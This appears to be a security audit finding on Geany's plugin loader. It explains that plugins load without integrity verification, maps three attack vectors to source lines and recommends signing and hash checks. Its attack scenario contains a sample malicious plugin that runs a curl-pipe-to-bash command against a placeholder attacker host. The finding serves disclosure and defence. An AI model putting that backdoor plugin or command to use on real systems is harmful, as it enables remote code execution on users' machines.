# No Plugin Integrity Verification (Arbitrary Code Execution)

| Field | Value |
|-------|-------|
| **Severity** | Critical |
| **CVSS** | 7.8 (AV:L/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H) |
| **CWE** | CWE-494: Download of Code Without Integrity Check |
| **File** | `src/plugins.c` |
| **Lines** | 552–594, 1153–1157 |
| **Affected Functions** | `plugin_load_gmodule()`, `load_plugins_from_path()`, `load_all_plugins()` |
| **Platform** | All |

## Description

Geany's plugin loading subsystem performs **zero integrity verification** on plugin binaries before calling `g_module_open()` / `dlopen()`. The only check performed is an ABI/API version comparison against compile-time constants (`plugin_check_version()`, lines 224–248), which is a compatibility mechanism — not a security boundary.

The attack surface is threefold:

### Vector A: User-Writable Plugin Directory

`load_all_plugins()` (line 1147) scans `~/.config/geany/plugins/` for shared objects and loads every valid plugin found:

```c
// plugins.c:1153-1157
plugin_path_config = g_build_filename(app->configdir, "plugins", NULL);
load_plugins_from_path(plugin_path_config);  // loads ALL .so files in this dir
```

This directory is **user-writable by definition**. Any process running as the user can drop a malicious `.so` here. The next Geany launch will `dlopen()` it unconditionally.

### Vector B: Custom Plugin Path

The configuration key `custom_plugin_path` (loaded at `plugins.c:1289–1290`) allows specifying any filesystem directory from which to load plugins:

```c
// plugins.c:1289-1290
stash_group_add_entry(group, &prefs.custom_plugin_path,
    "custom_plugin_path", "", "extra_plugin_path_entry");
```

An attacker who can modify `geany.conf` can set this to `/tmp/evil/` and achieve code execution on next startup.

### Vector C: System Plugin Path

On multi-user systems, if the system-wide plugin path (e.g. `/usr/lib/geany/`) is writable due to misconfiguration, an attacker with filesystem access can place a trojan plugin that all Geany users will load.

## Attack Scenario

1. Attacker compiles a malicious Geany plugin:
   ```c
   // evil.c
   #include <geanyplugin.h>
   GEANY_PLUGIN_REGISTER(evil_plugin, 225);

   void geany_load_module(GeanyPlugin *plugin) {
       system("curl http://evil.example/backdoor.sh | bash &");
       geany_plugin_register(plugin, 225, 225, 71);
   }
   ```

2. Attacker compiles and places `evil.so` in `~/.config/geany/plugins/`.

3. Victim launches Geany or opens the Plugin Manager.

4. `load_active_plugins()` → `load_plugins_from_path()` → `g_module_open("evil.so")` → `geany_load_module()` executes.

5. `system("curl ... | bash")` runs with full Geany process privileges.

No user prompt, no warning, no signature check occurs — the plugin loads silently.

## Impact

- **Confidentiality:** Complete. Malicious code runs in-process, with access to all open documents, project files, and Geany's internal state.
- **Integrity:** Complete. Plugin can modify documents, inject content, or alter saved files.
- **Persistence:** The plugin is loaded on every subsequent Geany launch.

## Recommended Fix

### Short-term (defense-in-depth)

- Warn the user when loading plugins from the user-writable `~/.config/geany/plugins/` directory versus the system plugin path.
- Only auto-load plugins that have been explicitly enabled by the user in the Plugin Manager (do not automatically activate newly discovered plugins).

### Medium-term (integrity framework)

- Ship a public key with Geany. Require that plugins distributed through official channels are signed.
- For third-party plugins, implement a **trust-on-first-use** (TOFU) model: on first load, compute and store a hash of the plugin binary. On subsequent loads, verify the hash matches. Warn the user if it has changed.
- Store plugin hashes in a secured location (e.g. `~/.config/geany/plugins/trusted_hashes`).

### Long-term (architecture)

- Consider loading plugins in a separate process with IPC, or using a sandboxed runtime (e.g. a Lua/Python interpreter with limited system access for non-native plugins).

## References

- `src/plugins.c:552–594` — `plugin_load_gmodule()`
- `src/plugins.c:1147–1179` — `load_all_plugins()`
- `src/plugins.c:1092–1115` — `load_plugins_from_path()`
- `src/plugins.c:1054–1089` — `load_active_plugins()`
